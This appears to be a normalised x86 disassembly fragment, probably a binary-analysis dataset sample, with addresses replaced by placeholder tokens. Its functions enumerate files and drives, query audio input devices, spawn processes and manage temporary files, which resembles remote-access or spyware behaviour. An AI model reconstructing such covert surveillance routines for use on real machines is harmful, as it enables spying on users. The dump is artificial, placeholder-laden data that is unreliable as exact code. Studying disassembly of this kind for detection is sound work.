push [ ebp + 0x8 ]
call [ FindClose@IAT ]
pop ebx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x148 ]
push eax
call edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0xc ]
push eax
call ebx
test [ ebp - 0x15c ] 0x10
je r-xdata
lea eax [ ebp - 0x130 ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x130 ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ecx
cmp [ ecx ] 0x0
je r-xdata
lea eax [ ebp - 0x130 ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ eax - 0x1 ] 0x5c
lea eax [ ebp - 0x130 ]
push eax
push ecx
je r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ecx
cmp [ ecx ] 0x0
je r-xdata
push rw-data
push rw-data
jmp r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
lea eax [ ebp - 0x2c4 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x2c4 ]
push eax
mov eax [ rw-data ]
imul eax eax 0x208
add eax rw-data
push eax
call strncpy
mov esi [ rw-data ]
lea eax [ ebp - 0x2c4 ]
push eax
imul esi esi 0x208
call strlen
and [ eax + esi + rw-data ] 0x0
inc [ rw-data ]
lea ecx [ ebp - 0x130 ]
lea eax [ esi + rw-data ]
push ecx
push eax
call strcpy
add esp 0x1c
lea eax [ ebp - 0x2c4 ]
push eax
call sprintf
add esp 0x10
cmp [ rw-data ] 0x3a98
jge r-xdata
jmp r-xdata
sub_404ed3
push ebp
mov ebp esp
sub esp 0x3c8
and [ ebp - 0x4 ] 0x0
push esi
push edi
push [ ebp + 0x8 ]
call _strdup
mov edi eax
pop ecx
cmp [ edi ] 0x0
je r-xdata
push [ ebp + 0xc ]
cmp [ eax - 0x1 ] 0x5c
push edi
je r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
mov edi [ FileTimeToLocalFileTime@IAT ]
lea eax [ ebp - 0x1c ]
push ebx
push eax
lea eax [ ebp - 0x148 ]
push eax
call edi
mov ebx [ FileTimeToSystemTime@IAT ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call ebx
test [ ebp - 0x15c ] 0x10
mov esi [ ebp - 0x13c ]
jne r-xdata
lea eax [ ebp - 0x15c ]
push eax
push edi
call esi
cmp eax 0xffffffff
mov [ ebp + 0xc ] eax
je r-xdata
lea eax [ ebp - 0x3c8 ]
push eax
call sprintf
mov esi [ FindFirstFileA@IAT ]
add esp 0x10
lea eax [ ebp - 0x15c ]
push eax
lea eax [ ebp - 0x3c8 ]
push eax
call esi
cmp eax 0xffffffff
mov [ ebp + 0xc ] eax
jne r-xdata
mov esi [ FindNextFileA@IAT ]
lea eax [ ebp - 0x15c ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x3c8 ]
mov [ ebp - 0x4 ] 0x1
push eax
lea eax [ ebp - 0x2c4 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2c4 ]
push eax
call sub_405240
lea eax [ ebp - 0x130 ]
push eax
push esi
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x2c4 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2c4 ]
push eax
call sub_405240
add esp 0x38
pop edi
xor eax eax
pop esi
leave
retn
push [ ebp + 0xc ]
call [ FindClose@IAT ]
cmp [ ebp - 0x4 ] 0x1
pop ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x148 ]
push eax
call edi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call ebx
test [ ebp - 0x15c ] 0x10
jne r-xdata
lea eax [ ebp - 0x2c4 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2c4 ]
push eax
call sub_405240
add esp 0xc
lea eax [ ebp - 0x15c ]
push eax
push [ ebp + 0xc ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x130 ]
push eax
movzx eax [ ebp - 0xa ]
push [ ebp - 0x13c ]
push eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x2c4 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2c4 ]
push eax
call sub_405240
add esp 0x28
lea eax [ ebp - 0x3c8 ]
mov [ ebp - 0x4 ] 0x1
push eax
lea eax [ ebp - 0x2c4 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2c4 ]
push eax
call sub_405240
add esp 0x10
sub_4050e9
push ebp
mov ebp esp
sub esp 0x184
push ebx
push esi
push [ ebp + 0x8 ]
call sub_40c987
pop ecx
mov ebx eax
push ebx
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
mov esi 0x80
push edi
push esi
call malloc
push esi
push 0x0
push eax
mov [ rw-data ] eax
call memset
add esp 0x10
push 0x43
pop esi
push 0x18
pop edi
push ebx
lea eax [ ebp - 0x184 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x184 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
add esp 0x14
jmp r-xdata
inc esi
dec edi
jne r-xdata
lea eax [ ebp - 0x184 ]
push eax
call sub_405288
pop ecx
mov [ rw-data ] eax
mov eax esi
pop esi
pop ebx
leave
retn
push esi
lea eax [ ebp - 0x184 ]
push rw-data
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x184 ]
push eax
call [ GetDriveTypeA@IAT ]
cmp eax 0x3
jne r-xdata
push rw-data
call sub_405240
mov [ esp ] rw-data
push ebx
call fopen
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push [ rw-data ]
call strlen
push eax
push ebx
lea eax [ ebp - 0x184 ]
push rw-data
push eax
call sprintf
add esp 0x14
push esi
push [ rw-data ]
call strlen
pop ecx
push eax
push 0x1
push [ rw-data ]
call fwrite
push esi
mov edi eax
call fclose
push edi
push ebx
lea eax [ ebp - 0x184 ]
push rw-data
push eax
call sprintf
add esp 0x24
jmp r-xdata
lea eax [ ebp - 0x184 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
pop ecx
push eax
call free
pop ecx
mov eax [ rw-data ]
pop edi
test eax eax
je r-xdata
sub_405240
push esi
mov esi [ esp + 0x8 ]
push esi
call strlen
test eax eax
pop ecx
jbe r-xdata
xor eax eax
pop esi
retn
push edi
push [ rw-data ]
call strlen
push esi
mov edi eax
call strlen
lea eax [ edi + eax + 0x1 ]
push eax
push [ rw-data ]
call realloc
push esi
push eax
mov [ rw-data ] eax
call strcat
add esp 0x18
pop edi
sub_405288
push ebp
mov ebp esp
push ecx
push ecx
and [ rw-data ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push ebx
call strlen
push eax
mov eax [ rw-data ]
imul eax eax 0x208
mov edi rw-data
push ebx
add eax edi
push eax
call strncpy
mov esi [ rw-data ]
push ebx
imul esi esi 0x208
call strlen
and [ eax + esi + rw-data ] 0x0
inc [ rw-data ]
lea esi [ esi + rw-data ]
push ebx
push esi
call strcpy
and [ ebp - 0x4 ] 0x0
add esp 0x1c
cmp [ rw-data ] 0x0
jle r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
mov [ ebp + 0x8 ] edi
mov edi rw-data
imul ebx ebx 0x104
cmp [ ebx + rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] edi
mov esi edi
inc [ ebp - 0x4 ]
add [ ebp + 0x8 ] 0x208
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jl r-xdata
push [ ebp + 0x8 ]
call sub_405378
pop ecx
add esi 0x104
inc ebx
mov [ ebp - 0x8 ] esi
cmp [ esi ] 0x0
jne r-xdata
xor ebx ebx
cmp [ rw-data ] bl
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x104
push eax
call strlen
push eax
mov eax [ ebp + 0x8 ]
add eax 0x104
push eax
push [ ebp - 0x8 ]
call _strnicmp
add esp 0x10
test eax eax
je r-xdata
sub_405378
push ebp
mov ebp esp
sub esp 0x3d4
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor edi edi
cmp [ eax ] 0x0
mov [ ebp - 0xc ] edi
je r-xdata
push [ rw-data ]
call _strdup
pop ecx
mov [ ebp + 0x8 ] eax
mov ebx eax
push eax
call sub_40c987
mov ebx eax
pop ecx
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp [ eax - 0x1 ] 0x5c
push ebx
je r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
push rw-data
push rw-data
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x154 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test [ ebp - 0x168 ] 0x10
je r-xdata
lea eax [ ebp - 0x168 ]
push eax
push ebx
call esi
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
je r-xdata
lea eax [ ebp - 0x3d4 ]
push eax
call sprintf
mov esi [ FindFirstFileA@IAT ]
add esp 0xc
lea eax [ ebp - 0x168 ]
push eax
lea eax [ ebp - 0x3d4 ]
push eax
call esi
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
lea eax [ ebp - 0x13c ]
push eax
call strlen
cmp eax 0x4
pop ecx
jb r-xdata
lea eax [ ebp - 0x13c ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
lea eax [ ebp - 0x168 ]
push eax
push [ ebp - 0x10 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
xor esi esi
lea eax [ ebp - 0x13c ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp - 0x10 ]
call [ FindClose@IAT ]
cmp [ ebp - 0xc ] 0x1
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x154 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test [ ebp - 0x168 ] 0x10
je r-xdata
lea eax [ ebp - 0x13c ]
push eax
call strlen
add eax esi
inc esi
cmp esi 0x4
pop ecx
mov al [ ebp + eax - 0x13f ]
mov [ ebp + esi - 0x9 ] al
jl r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx ] 0x0
mov eax ebx
je r-xdata
lea eax [ ebp - 0x2d0 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2d0 ]
push eax
call sub_405240
add esp 0xc
lea eax [ ebp - 0x13c ]
push eax
call strlen
cmp eax 0x4
pop ecx
jb r-xdata
lea eax [ ebp - 0x13c ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ edi + edi * 4 + rw-data ] 0x0
je r-xdata
mov esi rw-data
mov ebx esi
cmp [ eax - 0x1 ] 0x5c
lea eax [ ebp - 0x13c ]
push eax
push ebx
je r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
xor esi esi
lea eax [ ebp - 0x13c ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x3d4 ]
mov [ ebp - 0xc ] 0x1
push eax
lea eax [ ebp - 0x2d0 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2d0 ]
push eax
call sub_405240
lea eax [ ebp - 0x13c ]
push eax
movzx eax [ ebp - 0x16 ]
push [ ebp - 0x148 ]
push eax
movzx eax [ ebp - 0x18 ]
push eax
movzx eax [ ebp - 0x1a ]
push eax
movzx eax [ ebp - 0x1e ]
push eax
movzx eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x2d0 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2d0 ]
push eax
call sub_405240
add esp 0x38
mov ebx [ ebp + 0x8 ]
add esi 0x5
inc edi
mov ebx esi
cmp [ esi ] 0x0
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
lea eax [ ebp - 0x13c ]
push eax
call strlen
add eax esi
inc esi
cmp esi 0x4
pop ecx
mov al [ ebp + eax - 0x13f ]
mov [ ebp + esi - 0x9 ] al
jl r-xdata
and [ ebp - 0x4 ] 0x0
xor edi edi
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx ] 0x0
mov eax ebx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x8 ]
push eax
push ebx
call _strnicmp
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp - 0x2d0 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x2d0 ]
push eax
mov eax [ rw-data ]
imul eax eax 0x208
add eax rw-data
push eax
call strncpy
mov esi [ rw-data ]
lea eax [ ebp - 0x2d0 ]
push eax
imul esi esi 0x208
call strlen
and [ eax + esi + rw-data ] 0x0
inc [ rw-data ]
lea ecx [ ebp - 0x13c ]
lea eax [ esi + rw-data ]
push ecx
push eax
call strcpy
add esp 0x1c
jmp r-xdata
lea eax [ ebp - 0x2d0 ]
push eax
call sprintf
add esp 0x10
cmp [ rw-data ] 0x3a98
jge r-xdata
cmp [ edi + edi * 4 + rw-data ] 0x0
je r-xdata
mov ebx rw-data
mov esi ebx
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ebx [ ebp + 0x8 ]
add esi 0x5
inc edi
mov ebx esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x13c ]
push eax
movzx eax [ ebp - 0x16 ]
push [ ebp - 0x148 ]
push eax
movzx eax [ ebp - 0x18 ]
push eax
movzx eax [ ebp - 0x1a ]
push eax
movzx eax [ ebp - 0x1e ]
push eax
movzx eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x2d0 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2d0 ]
push eax
call sub_405240
add esp 0x28
jmp r-xdata
lea eax [ ebp - 0x3d4 ]
mov [ ebp - 0xc ] 0x1
push eax
lea eax [ ebp - 0x2d0 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x2d0 ]
push eax
call sub_405240
add esp 0x10
lea eax [ ebp - 0x8 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x8 ]
push eax
push ebx
call _strnicmp
add esp 0x10
test eax eax
je r-xdata
sub_4057d2
push ebp
mov ebp esp
sub esp 0x100
push esi
push [ ebp + 0x8 ]
call atoi
mov esi eax
imul eax eax 0x3e8
push eax
call _sleep
push esi
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x100 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
add esp 0x1c
mov [ rw-data ] eax
mov eax esi
pop esi
leave
retn
sub_405825
push ebp
mov ebp esp
sub esp 0x430
push esi
push edi
call [ waveInGetNumDevs@IAT ]
mov esi eax
test esi esi
jne r-xdata
push esi
lea eax [ ebp - 0x430 ]
push rw-data
push eax
call sprintf
add esp 0xc
xor edi edi
test esi esi
jle r-xdata
push rw-data
call _strdup
pop ecx
jmp r-xdata
lea eax [ ebp - 0x430 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop edi
pop esi
leave
retn
push ebx
inc edi
cmp edi esi
jl r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x430 ]
push eax
call strcat
lea eax [ ebp - 0x430 ]
push rw-data
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x30 ]
push 0x30
push eax
push edi
call [ waveInGetDevCapsA@IAT ]
lea eax [ ebp - 0x28 ]
push eax
call strlen
mov ebx eax
lea eax [ ebp - 0x430 ]
push eax
call strlen
add ebx eax
pop ecx
cmp ebx 0x3fd
pop ecx
jae r-xdata
pop ebx
sub_4058e0
push ebp
mov ebp esp
sub esp 0x454
push esi
push rw-data
lea eax [ ebp - 0x454 ]
push rw-data
push eax
call sprintf
xor esi esi
push 0x44
lea eax [ ebp - 0x54 ]
push esi
push eax
call memset
push 0x10
lea eax [ ebp - 0x10 ]
push esi
push eax
call memset
add esp 0x24
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x54 ] 0x44
mov [ ebp - 0x28 ] 0x81
push eax
lea eax [ ebp - 0x54 ]
push eax
push esi
push esi
push 0x20
push esi
push esi
lea eax [ ebp - 0x454 ]
push esi
push eax
push esi
mov [ ebp - 0x24 ] si
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
push 0x2
call [ ExitProcess@IAT ]
push rw-data
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
leave
retn
sub_405976
push ebp
mov ebp esp
sub esp 0x41c
push ebx
push esi
push edi
push 0x1
call malloc
mov esi eax
pop ecx
test esi esi
jne r-xdata
and [ esi ] 0x0
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x1c ] rw-data
mov [ ebp - 0x18 ] rw-data
mov [ ebp - 0x14 ] rw-data
lea edi [ ebp - 0x1c ]
push 0x1
call exit
push 0x1
call exit
push [ ebp - 0x4 ]
push esi
call strcat
cmp [ ebp - 0x4 ] 0x0
pop ecx
pop ecx
je r-xdata
inc [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] 0x3
jl r-xdata
push [ ebp - 0x4 ]
call free
pop ecx
push [ edi ]
call sub_403e90
push eax
mov [ ebp - 0x4 ] eax
call _msize
push esi
mov ebx eax
call _msize
add ebx eax
push ebx
push esi
call realloc
mov esi eax
add esp 0x14
test esi esi
je r-xdata
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x1c ] rw-data
mov [ ebp - 0x18 ] rw-data
mov [ ebp - 0x14 ] rw-data
mov [ ebp - 0x10 ] rw-data
lea edi [ ebp - 0x1c ]
push 0x1
call exit
push [ ebp - 0x4 ]
push esi
call strcat
cmp [ ebp - 0x4 ] 0x0
pop ecx
pop ecx
je r-xdata
inc [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] 0x4
jl r-xdata
push [ ebp - 0x4 ]
call free
pop ecx
push [ edi ]
call sub_403e90
push eax
mov [ ebp - 0x4 ] eax
call _msize
push esi
mov ebx eax
call _msize
add ebx eax
push ebx
push esi
call realloc
mov esi eax
add esp 0x14
test esi esi
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
test eax eax
jle r-xdata
and [ ebp - 0x8 ] 0x0
test eax eax
jle r-xdata
mov [ ebp - 0x4 ] rw-data
lea eax [ ebp - 0x41c ]
push rw-data
push eax
call sprintf
push esi
call _msize
mov edi eax
lea eax [ ebp - 0x41c ]
push eax
call strlen
add edi eax
push edi
push esi
call realloc
mov esi eax
add esp 0x18
test esi esi
jne r-xdata
mov [ ebp - 0x4 ] rw-data
push 0x1
call exit
push edi
push esi
call strcat
pop ecx
test edi edi
pop ecx
je r-xdata
lea eax [ ebp - 0x41c ]
push eax
push esi
call strcat
push esi
call _strdup
push esi
mov edi eax
call free
push edi
call strlen
add esp 0x14
mov [ rw-data ] eax
mov eax edi
pop edi
pop esi
pop ebx
leave
retn
push 0x1
call exit
push 0x1
call exit
push edi
push esi
call strcat
pop ecx
test edi edi
pop ecx
je r-xdata
inc [ ebp - 0x8 ]
mov eax [ rw-data ]
add [ ebp - 0x4 ] 0x104
cmp [ ebp - 0x8 ] eax
jl r-xdata
push edi
call free
pop ecx
inc [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0x104
mov eax [ ebp - 0x8 ]
cmp eax [ rw-data ]
jl r-xdata
push edi
call free
pop ecx
push [ ebp - 0x4 ]
call sub_403e90
mov edi eax
push edi
call _msize
push esi
mov ebx eax
call _msize
add ebx eax
push ebx
push esi
call realloc
mov esi eax
add esp 0x14
test esi esi
je r-xdata
push [ ebp - 0x4 ]
call sub_403e90
mov edi eax
push edi
call _msize
push esi
mov ebx eax
call _msize
add ebx eax
push ebx
push esi
call realloc
mov esi eax
add esp 0x14
test esi esi
je r-xdata
jmp r-xdata
sub_405bd7
push ebp
mov ebp esp
sub esp 0x260
push ebx
push esi
push edi
push 0x184
call malloc
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
push 0x1
call exit
push [ rw-data ]
call _strdup
mov edi eax
pop ecx
mov [ ebp - 0x4 ] edi
mov ebx eax
push eax
call sub_40c987
mov ebx eax
pop ecx
mov [ ebp - 0x4 ] ebx
mov edi ebx
jmp r-xdata
cmp [ edi - 0x1 ] 0x5c
push ebx
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push ebx
push rw-data
push esi
call sprintf
add esp 0xc
cmp [ ebx ] 0x0
je r-xdata
push rw-data
push rw-data
jmp r-xdata
mov edi [ FileTimeToLocalFileTime@IAT ]
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24c ]
push eax
call edi
mov ebx [ FileTimeToSystemTime@IAT ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x260 ]
push eax
push ebx
call edi
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x120 ]
push eax
call sprintf
mov edi [ FindFirstFileA@IAT ]
add esp 0xc
lea eax [ ebp - 0x260 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
call edi
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
jne r-xdata
push [ ebp - 0x240 ]
lea eax [ ebp - 0x120 ]
push rw-data
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x120 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
jmp r-xdata
push ebx
push rw-data
push esi
call sprintf
add esp 0xc
push [ ebp + 0x8 ]
call [ FindClose@IAT ]
push rw-data
push esi
call strcat
mov ebx [ ebp - 0x4 ]
pop ecx
pop ecx
jmp r-xdata
push esi
call _msize
add eax 0x184
push eax
push esi
call realloc
mov esi eax
add esp 0xc
test esi esi
je r-xdata
lea eax [ ebp - 0x120 ]
push eax
push esi
call strcat
lea eax [ ebp - 0x234 ]
push eax
lea eax [ ebp - 0x120 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x120 ]
push eax
push esi
call strcat
add esp 0x1c
lea eax [ ebp - 0x260 ]
push eax
push [ ebp + 0x8 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
test esi esi
je r-xdata
push ebx
call free
pop ecx
push esi
call _strdup
mov edi eax
push edi
call strlen
pop ecx
mov [ rw-data ] eax
test ebx ebx
pop ecx
je r-xdata
push 0x1
call exit
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24c ]
push eax
call edi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
leave
retn
push esi
call free
pop ecx
call ebx
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x120 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x120 ]
push eax
push esi
call strcat
add esp 0x28
test [ ebp - 0x260 ] 0x10
je r-xdata
sub_405e11
push ebp
mov ebp esp
sub esp 0x110
push esi
push [ ebp + 0x8 ]
call atoi
mov esi eax
pop ecx
test esi esi
jne r-xdata
cmp esi 0x5
jge r-xdata
and [ rw-data ] eax
push rw-data
lea eax [ esi + esi * 4 ]
and [ rw-data ] 0x0
shl eax 0x1
mov [ rw-data ] eax
lea eax [ ebp - 0x10 ]
push eax
mov [ rw-data ] 0x1
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x110 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x110 ]
push eax
call sub_405fdd
add esp 0x24
test eax eax
je r-xdata
push rw-data
jmp r-xdata
lea eax [ ebp - 0x110 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
leave
retn
push esi
lea eax [ ebp - 0x110 ]
push rw-data
push eax
call sprintf
add esp 0xc
push eax
call free
pop ecx
lea eax [ ebp - 0x110 ]
push eax
call sprintf
pop ecx
pop ecx
jmp r-xdata
sub_405ef7
push ebp
mov ebp esp
sub esp 0x110
push esi
push [ ebp + 0x8 ]
call atoi
mov esi eax
pop ecx
test esi esi
jne r-xdata
cmp esi 0x5
jge r-xdata
and [ rw-data ] eax
push rw-data
lea eax [ esi + esi * 4 ]
and [ rw-data ] 0x0
shl eax 0x1
mov [ rw-data ] eax
lea eax [ ebp - 0x10 ]
push eax
mov [ rw-data ] 0x1
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x110 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x110 ]
push eax
call sub_4061f0
add esp 0x24
test eax eax
je r-xdata
push rw-data
jmp r-xdata
lea eax [ ebp - 0x110 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
leave
retn
push esi
lea eax [ ebp - 0x110 ]
push rw-data
push eax
call sprintf
add esp 0xc
push eax
call free
pop ecx
lea eax [ ebp - 0x110 ]
push eax
call sprintf
pop ecx
pop ecx
jmp r-xdata
sub_405fdd
push ebp
mov ebp esp
sub esp 0x410
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x210 ]
push eax
push 0x104
movsb [ edi ] [ esi ]
call [ GetTempPathA@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call sprintf
push [ ebp + 0x8 ]
call sub_4060db
mov esi eax
lea eax [ ebp - 0x410 ]
push esi
push rw-data
push eax
call sprintf
add esp 0x20
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call sub_406546
mov esi eax
lea eax [ ebp - 0x8 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call strncmp
add esp 0x14
test eax eax
je r-xdata
push esi
call free
pop ecx
lea eax [ ebp - 0x410 ]
push esi
push eax
call strcat
pop ecx
test esi esi
pop ecx
je r-xdata
lea eax [ ebp - 0x10c ]
push eax
call remove
jmp r-xdata
lea eax [ ebp - 0x10c ]
push eax
call remove
test eax eax
pop ecx
jne r-xdata
push esi
call free
pop ecx
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x410 ]
push eax
call _strdup
mov esi eax
lea eax [ ebp - 0x410 ]
push rw-data
push eax
call strcat
pop ecx
pop ecx
sub_4060db
push ebp
mov ebp esp
sub esp 0x354
lea eax [ ebp - 0x354 ]
push esi
push eax
push 0x104
call [ GetTempPathA@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x354 ]
push eax
lea eax [ ebp - 0x110 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x110 ]
push rw-data
push eax
call fopen
add esp 0x18
test eax eax
je r-xdata
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x250 ]
push rw-data
push eax
call sprintf
add esp 0xc
push eax
call fclose
pop ecx
lea eax [ ebp - 0x110 ]
push eax
call [ DeleteFileA@IAT ]
push [ rw-data ]
lea eax [ ebp - 0x110 ]
push eax
call sub_40cc20
lea eax [ ebp - 0x110 ]
push rw-data
push eax
call fopen
mov esi eax
push [ esi + 0x10 ]
call _filelength
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x250 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
push [ rw-data ]
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x250 ]
push rw-data
push eax
call sprintf
add esp 0x10
jmp r-xdata
lea eax [ ebp - 0x250 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
leave
retn
push esi
call fclose
pop ecx
jmp r-xdata
sub_4061f0
